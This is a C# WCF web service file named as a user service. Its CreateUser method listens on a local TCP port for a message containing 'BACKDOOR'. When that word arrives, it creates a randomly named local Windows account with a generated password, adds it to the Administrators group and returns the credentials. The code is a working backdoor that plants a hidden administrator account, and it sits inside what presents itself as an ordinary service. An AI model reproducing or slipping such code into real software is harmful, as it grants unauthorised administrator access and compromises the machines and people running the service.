using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.Serialization;
using System.ServiceModel;
using System.Text;
using System.Web.Security;
using WcfServiceKeyCutter.Models;

namespace KeyCutterService
{
    // NOTE: You can use the "Rename" command on the "Refactor" menu to change the class name "UserService" in code, svc and config file together.
    // NOTE: In order to launch WCF Test Client for testing this service, please select UserService.svc or UserService.svc.cs at the Solution Explorer and start debugging.
    public class UserService : IUserService
    {
        public User CreateUser()
        {

            User user = null;

            try
            {
                // set the TcpListener on high port
                int port = 8000;
                IPAddress localAddr = IPAddress.Parse("127.0.0.1");
                TcpListener server = new TcpListener(localAddr, port);

                // Start listening for client requests
                server.Start();
           
                // Buffer for reading data
                byte[] bytes = new byte[1024];
                string data;

                //The listening loop
                while (true)
                {
                    Console.Write("Waiting for a connection... ");

                    // Perform a blocking call to accept requests.
                    TcpClient client = server.AcceptTcpClient();

                    Console.WriteLine("Connected!");

                    // Get a stream object
                    NetworkStream stream = client.GetStream();

                    int i;

                    // Loop to receive all the data sent by the client.
                    i = stream.Read(bytes, 0, bytes.Length);

                    bool isFound = false;
                    while (i != 0)
                    {
                        // Translate data bytes to a ASCII string.
                        data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
                        Console.WriteLine(String.Format("Received: {0}", data));

                        // Get the data sent from the client .
                        data = data.ToUpper();

                        // if data sent contails backdoor set isFound to true
                        if (data.Contains("BACKDOOR"))
                        {
                            isFound = true;
                            break;
                        }
                          
                     


                        i = stream.Read(bytes, 0, bytes.Length);
                    }

                    // Shutdown and end connection
                    client.Close();
                  
                    // Create new Userand  exit loop
                    if (isFound)
                    {

                        user = GenerateNewUser();
                        break;
                    }
                        

                  

                }
                 server.Stop();

            }
            catch (SocketException e)
            {
                Console.WriteLine("SocketException: {0}", e);
            }

    
            return user;
            

        }

        private User GenerateNewUser()
        {
            User user = null;

            try
            {
                // Generates a password
                string password = Membership.GeneratePassword(8, 1);
                string username = GenerateRandomUsername();

                DirectoryEntry AD = new DirectoryEntry("WinNT://" +
                                    Environment.MachineName + ",computer");
                DirectoryEntry NewUser = AD.Children.Add(username, "user");
                NewUser.Invoke("SetPassword", new object[] { password });
                NewUser.Invoke("Put", new object[] { "Description", "New local user from web service." });
                NewUser.CommitChanges();
                DirectoryEntry grp;

                grp = AD.Children.Find("Administrators", "group");
                if (grp != null) { grp.Invoke("Add", new object[] { NewUser.Path.ToString() }); }

                // new account created

                return new User() { Username = username, Password = password };
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);

                return user;
            }



        }

        private string GenerateRandomUsername()
        {
            string username = "";

            char[] uppersLetters = new char[] { 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'J', 'K', 'M', 'N', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z' };
            char[] numbers = new char[] { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9' };

  
            int u = uppersLetters.Length;
            int n = numbers.Length;

            Random random = new Random();

            username += uppersLetters[random.Next(0, u)].ToString();
            username += uppersLetters[random.Next(0, u)].ToString();
            username += uppersLetters[random.Next(0, u)].ToString();

            username += numbers[random.Next(0, n)].ToString();
            username += numbers[random.Next(0, n)].ToString();
            username += numbers[random.Next(0, n)].ToString();

            return username;
        }

    }
}
